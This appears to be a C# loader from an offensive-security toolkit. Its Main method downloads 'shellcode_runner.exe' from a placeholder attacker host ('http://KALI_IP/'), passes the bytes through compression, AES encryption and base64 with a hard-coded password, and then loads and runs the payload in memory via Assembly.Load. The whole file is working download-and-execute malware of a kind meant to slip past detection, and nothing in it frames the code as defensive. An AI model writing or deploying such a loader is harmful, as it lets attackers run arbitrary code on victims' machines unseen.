using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Net;

namespace Compr_Decompr_b64
{
    class Program
    {

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] result = null;
            byte[] salt = new byte[]
            {
                1,
                2,
                3,
                4,
                5,
                6,
                7,
                8
            };
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                {
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
            }
            return result;
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] result = null;
            byte[] salt = new byte[]
            {
                1,
                2,
                3,
                4,
                5,
                6,
                7,
                8
            };
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                {
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    rijndaelManaged.Padding = PaddingMode.PKCS7;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
            }
            return result;
        }
        public static void Decompression(string b64)
        {

            var outputStream = new System.IO.MemoryStream();
            byte[] inputBytes = Convert.FromBase64String(b64);
            var inputStream = new MemoryStream(inputBytes);
            var deflateStream = new System.IO.Compression.DeflateStream(inputStream, System.IO.Compression.CompressionMode.Decompress);
            
            byte[] byteArray = new byte[1024];
            var r = deflateStream.Read(byteArray, 0, 1024); 

            while (r > 0) {
                outputStream.Write(byteArray, 0, r);
                r = deflateStream.Read(byteArray, 0, 1024);
            }
            
            System.Reflection.Assembly.Load(outputStream.ToArray()).EntryPoint.Invoke(null, null);

            

        }
        public static void ruleThemAll(byte[] runnerBytes)
        {
            byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("6rtDJKyeH8KElfpqRp31!"));
            var outputStream = new System.IO.MemoryStream();
            byte[] contents = runnerBytes;

            using (var deflateStream = new System.IO.Compression.DeflateStream(outputStream, System.IO.Compression.CompressionMode.Compress))
                deflateStream.Write(contents, 0, contents.Length);
            var outputBytes = outputStream.ToArray();
            var enc_bytes = AES_Encrypt(outputBytes, passwordBytes);
            var deflate_b64 = Convert.ToBase64String(AES_Decrypt(enc_bytes, passwordBytes));
            Decompression(deflate_b64);
        }

        public static void Main(string[] args)
        {
            byte[] contents;
            MemoryStream ms = new MemoryStream();

            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create("http://KALI_IP/shellcode_runner.exe");
            myRequest.Method = "GET";
            WebResponse myResponse = myRequest.GetResponse();
            myResponse.GetResponseStream().CopyTo(ms);
            contents = ms.ToArray();

            ruleThemAll(contents);

        }
    }
}
